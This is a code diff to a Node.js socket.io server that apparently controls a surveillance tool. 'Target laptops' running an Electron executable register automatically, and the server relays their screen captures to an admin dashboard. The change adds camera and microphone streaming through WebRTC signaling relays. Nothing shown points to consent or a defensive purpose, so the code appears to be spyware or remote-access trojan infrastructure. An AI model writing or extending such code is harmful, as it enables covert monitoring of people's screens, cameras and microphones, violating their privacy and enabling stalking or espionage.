@@ -14,9 +14,11 @@ let clients = {}; // Keep track of all connected target laptops
 io.on('connection', (socket) => {
   
   // A target laptop (Electron EXE) connects automatically and registers itself
-  socket.on('register-client', (hostname) => {
-    console.log('Target Laptop Connected:', hostname, socket.id);
-    clients[socket.id] = { id: socket.id, name: hostname };
+  socket.on('register-client', (data) => {
+    let hostname = typeof data === 'string' ? data : data.name;
+    let type = data.type || 'screen';
+    console.log('Target Laptop Connected:', hostname, socket.id, 'Type:', type);
+    clients[socket.id] = { id: socket.id, name: hostname, type: type };
     // Tell the admin dashboard to update the UI
     io.emit('client-list', clients);
   });
@@ -43,6 +45,19 @@ io.on('connection', (socket) => {
   // Relay screen frames from client to admin
   socket.on('screen-frame', (data) => {
     io.to(data.targetId).emit('screen-frame', { frame: data.frame, from: socket.id });
+  });
+
+  // WebRTC Signaling relays for Camera/Mic clients
+  socket.on('offer', (data) => {
+    io.to(data.targetId).emit('offer', { offer: data.offer, from: socket.id });
+  });
+
+  socket.on('answer', (data) => {
+    io.to(data.targetId).emit('answer', { answer: data.answer, from: socket.id });
+  });
+
+  socket.on('ice-candidate', (data) => {
+    io.to(data.targetId).emit('ice-candidate', { candidate: data.candidate, from: socket.id });
   });
 
   socket.on('disconnect', () => {
